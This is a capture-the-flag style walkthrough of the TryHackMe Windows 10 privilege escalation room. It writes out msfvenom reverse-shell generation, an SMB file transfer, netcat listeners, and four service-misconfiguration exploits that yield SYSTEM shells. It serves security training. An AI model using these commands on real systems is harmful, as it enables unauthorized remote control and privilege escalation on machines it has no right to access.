# Room
https://tryhackme.com/room/windows10privesc

# Task 1 - Deploy VM and connect using RDP
I use Remmina for RDP: https://remmina.org/

# Task 2 - Generate a reverse shell exe
* Create and transfer reverse.exe to the target
    ```
    msfvenom -p windows/x64/shell_reverse_tcp LHOST=a.b.c.d LPORT=1234 -f exe -o reverse.exe

    [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
    [-] No arch selected, selecting arch: x64 from the payload
    No encoder specified, outputting raw payload
    Payload size: 460 bytes
    Final size of exe file: 7168 bytes
    Saved as: reverse.exe
    ```
* Start local SMB server to host the file
    ```
    sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py transfer .

    Impacket v0.9.23.dev1+20201209.133255.ac307704 - Copyright 2020 SecureAuth Corporation

    [*] Config file parsed
    [*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
    [*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
    [*] Config file parsed
    [*] Config file parsed
    [*] Config file parsed
    ```
* From the target, copy the file
    ```
    PS C:\users\user> cd \privesc
    PS C:\privesc> copy \\a.b.c.d\transfer\reverse.exe .
    PS C:\privesc> dir reverse.exe


        Directory: C:\privesc


    Mode                LastWriteTime         Length Name
    ----                -------------         ------ ----
    -a----        1/25/2021   7:17 AM           7168 reverse.exe    
    ```
* Setup a local listener
    ```
    nc -nvlp 1234
    listening on [any] 1234 ...
    ```
* Execute reverse.exe on the target
    ```
    PS C:\privesc> .\reverse.exe
    PS C:\privesc>    
    ```
* Check listener
    ```
    nc -nvlp 1234
    listening on [any] 1234 ...
    connect to [a.b.c.d] from (UNKNOWN) [10.10.153.222] 49824
    Microsoft Windows [Version 10.0.17763.737]
    (c) 2018 Microsoft Corporation. All rights reserved.

    C:\privesc>
    ```
# Task 3 - Service Exploits - Insecure Service Permissions
Use AccessChk to look at permissions

https://docs.microsoft.com/en-us/sysinternals/downloads/accesschk

* Check permissions for the user "user" to the service "daclsvc"
    ```
    C:\privesc>accesschk.exe /accepteula -uwcqv user daclsvc
    accesschk.exe /accepteula -uwcqv user daclsvc
    RW daclsvc
            SERVICE_QUERY_STATUS
            SERVICE_QUERY_CONFIG
            SERVICE_CHANGE_CONFIG      <----------------------
            SERVICE_INTERROGATE
            SERVICE_ENUMERATE_DEPENDENTS
            SERVICE_START
            SERVICE_STOP
            READ_CONTROL
    ```
* Query the daclsvc
    ```
    C:\privesc>sc qc daclsvc
    sc qc daclsvc
    [SC] QueryServiceConfig SUCCESS

    SERVICE_NAME: daclsvc
            TYPE               : 10  WIN32_OWN_PROCESS 
            START_TYPE         : 3   DEMAND_START
            ERROR_CONTROL      : 1   NORMAL
            BINARY_PATH_NAME   : "C:\Program Files\DACL Service\daclservice.exe"
            LOAD_ORDER_GROUP   : 
            TAG                : 0
            DISPLAY_NAME       : DACL Service
            DEPENDENCIES       : 
            SERVICE_START_NAME : LocalSystem
    ```
* Because we are allowed the permission SERVICE_CHANGE_CONFIG, we can change things about the service, here we will change the BINARY_PATH_NAME to that of our reverse.exe program
    ```
    C:\privesc>sc config daclsvc binpath= "\"C:\privesc\reverse.exe\""
    sc config daclsvc binpath= "\"C:\privesc\reverse.exe\""
    [SC] ChangeServiceConfig SUCCESS
    ```
* Setup local listener
    ```
    nc -nvlp 1234
    listening on [any] 1234 ...    
    ```
* Start the daclsvc service to execute the new BINARY_PATH_NAME
    ```
    C:\Users\user>net start daclsvc
    ```
* Check listener
    ```
    nc -nvlp 1234
    listening on [any] 1234 ...
    connect to [a.b.c.d] from (UNKNOWN) [10.10.153.222] 49873
    Microsoft Windows [Version 10.0.17763.737]
    (c) 2018 Microsoft Corporation. All rights reserved.

    C:\Windows\system32>whoami
    whoami
    nt authority\system

    C:\Windows\system32>
    ```

# Task 4 - Service Exploits - Unquoted Service Path
A path that doesn't contain quotes can be exploited
* Query the unquoted service
    ```
    C:\PrivEsc>sc qc unquotedsvc
    [SC] QueryServiceConfig SUCCESS

    SERVICE_NAME: unquotedsvc
            TYPE               : 10  WIN32_OWN_PROCESS
            START_TYPE         : 3   DEMAND_START
            ERROR_CONTROL      : 1   NORMAL
            BINARY_PATH_NAME   : C:\Program Files\Unquoted Path Service\Common Files\unquotedpathservice.exe
            LOAD_ORDER_GROUP   :
            TAG                : 0
            DISPLAY_NAME       : Unquoted Path Service
            DEPENDENCIES       :
            SERVICE_START_NAME : LocalSystem    
    ```
* Check permissions with accesschk
    ```
    C:\PrivEsc>accesschk /accepteula -uwdq "c:\program files\unquoted path service\"
    c:\program files\Unquoted Path Service
    Medium Mandatory Level (Default) [No-Write-Up]
    RW BUILTIN\Users          <------------------------------
    RW NT SERVICE\TrustedInstaller
    RW NT AUTHORITY\SYSTEM
    RW BUILTIN\Administrators    
    ```
* Copy reverse.exe to C:\Program Files\Unquoted Path Service\Common.exe, because there is a space in between the word Common and Files in the path, the service will look to execute Common
    ```
    C:\PrivEsc>copy reverse.exe "c:\program files\unquoted path service\common.exe"
            1 file(s) copied.    
    ```
* Start a local listener
    ```
    nc -nvlp 1234
    listening on [any] 1234 ...
    ```
* Start the service
    ```
    C:\PrivEsc>net start unquotedsvc
    ```
* Check the listener
    ```
    nc -nvlp 1234
    listening on [any] 1234 ...
    connect to [a.b.c.d] from (UNKNOWN) [10.10.244.101] 49751
    Microsoft Windows [Version 10.0.17763.737]
    (c) 2018 Microsoft Corporation. All rights reserved.

    C:\Windows\system32>whoami
    whoami
    nt authority\system

    C:\Windows\system32>
    ```
# Task 5 - Service Exploits - Weak Registry Permissions
Check the registry service and note what permissions it runs with
* Check the registry service
    ```
    C:\PrivEsc>sc qc regsvc
    [SC] QueryServiceConfig SUCCESS

    SERVICE_NAME: regsvc
            TYPE               : 10  WIN32_OWN_PROCESS
            START_TYPE         : 3   DEMAND_START
            ERROR_CONTROL      : 1   NORMAL
            BINARY_PATH_NAME   : "C:\Program Files\Insecure Registry Service\insecureregistryservice.exe"
            LOAD_ORDER_GROUP   :
            TAG                : 0
            DISPLAY_NAME       : Insecure Registry Service
            DEPENDENCIES       :
            SERVICE_START_NAME : LocalSystem
    ```
* Look at permissions with accesschk
    ```
    C:\PrivEsc>accesschk.exe /accepteula -uvwqk HKLM\System\CurrentControlSet\Services\regsvc
    HKLM\System\CurrentControlSet\Services\regsvc
    Medium Mandatory Level (Default) [No-Write-Up]
    RW NT AUTHORITY\SYSTEM
            KEY_ALL_ACCESS
    RW BUILTIN\Administrators
            KEY_ALL_ACCESS
    RW NT AUTHORITY\INTERACTIVE      <----------------------
            KEY_ALL_ACCESS    
    ```
* Get details about the service from the registry
    ```
    C:\PrivEsc>reg query HKLM\System\CurrentControlSet\Services\regsvc

    HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services\regsvc
        Type    REG_DWORD    0x10
        Start    REG_DWORD    0x3
        ErrorControl    REG_DWORD    0x1
        ImagePath    REG_EXPAND_SZ    "C:\Program Files\Insecure Registry Service\insecureregistryservice.exe"
        DisplayName    REG_SZ    Insecure Registry Service
        ObjectName    REG_SZ    LocalSystem

    HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services\regsvc\Security    
    ```
* Overwrite the ImagePath pointer from executing insecureregistryservice.exe to reverse.exe
    ```
    C:\PrivEsc>reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d C:\PrivEsc\reverse.exe /f
    The operation completed successfully.    
    ```
* Verify it
    ```
    C:\PrivEsc>reg query HKLM\System\CurrentControlSet\Services\regsvc

    HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services\regsvc
        Type    REG_DWORD    0x10
        Start    REG_DWORD    0x3
        ErrorControl    REG_DWORD    0x1
        ImagePath    REG_EXPAND_SZ    C:\PrivEsc\reverse.exe
        DisplayName    REG_SZ    Insecure Registry Service
        ObjectName    REG_SZ    LocalSystem

    HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services\regsvc\Security    
    ```
* Setup a local listener
    ```
    nc -nvlp 1234
    listening on [any] 1234 ...
    ```
* Start the service
    ```
    C:\PrivEsc>net start regsvc    
    ```
* Check your listener
    ```
    nc -nvlp 1234
    listening on [any] 1234 ...
    connect to [a.b.c.d] from (UNKNOWN) [10.10.244.101] 49794
    Microsoft Windows [Version 10.0.17763.737]
    (c) 2018 Microsoft Corporation. All rights reserved.

    C:\Windows\system32>whoami
    whoami
    nt authority\system

    C:\Windows\system32>
    ```
# Task 6 - Service Exploits - Insecure Service Executables
Review the file permissions service
* Check the service
    ```
    C:\PrivEsc>sc qc filepermsvc
    [SC] QueryServiceConfig SUCCESS

    SERVICE_NAME: filepermsvc
            TYPE               : 10  WIN32_OWN_PROCESS
            START_TYPE         : 3   DEMAND_START
            ERROR_CONTROL      : 1   NORMAL
            BINARY_PATH_NAME   : "C:\Program Files\File Permissions Service\filepermservice.exe"
            LOAD_ORDER_GROUP   :
            TAG                : 0
            DISPLAY_NAME       : File Permissions Service
            DEPENDENCIES       :
            SERVICE_START_NAME : LocalSystem    
    ```
* Check access
    ```
    C:\PrivEsc>accesschk.exe /accepteula -quvw "C:\Program Files\File Permissions Service\filepermservice.exe"
    C:\Program Files\File Permissions Service\filepermservice.exe
    Medium Mandatory Level (Default) [No-Write-Up]
    RW Everyone      <----------------------
            FILE_ALL_ACCESS
    RW NT AUTHORITY\SYSTEM
            FILE_ALL_ACCESS
    RW BUILTIN\Administrators
            FILE_ALL_ACCESS
    RW WIN-QBA94KB3IOF\Administrator
            FILE_ALL_ACCESS
    RW BUILTIN\Users
            FILE_ALL_ACCESS    
    ```
* Since the Everyone group has RW access, you can just copy reverse.exe and overwrite C:\Program Files\File Permissions Service\filepermservice.exe
    ```
    C:\PrivEsc>copy reverse.exe "c:\program files\file permissions service\filepermservice.exe" /y
            1 file(s) copied.    
    ```
* Setup local listener
    ```
    nc -nvlp 1234
    listening on [any] 1234 ...
    ```
* Start the service
    ```
    C:\PrivEsc>net start filepermsvc
    ```
* Check your listener
    ```
    nc -nvlp 1234
    listening on [any] 1234 ...
    connect to [a.b.c.d] from (UNKNOWN) [10.10.244.101] 49843
    Microsoft Windows [Version 10.0.17763.737]
    (c) 2018 Microsoft Corporation. All rights reserved.

    C:\Windows\system32>whoami
    whoami
    nt authority\system

    C:\Windows\system32>
    ```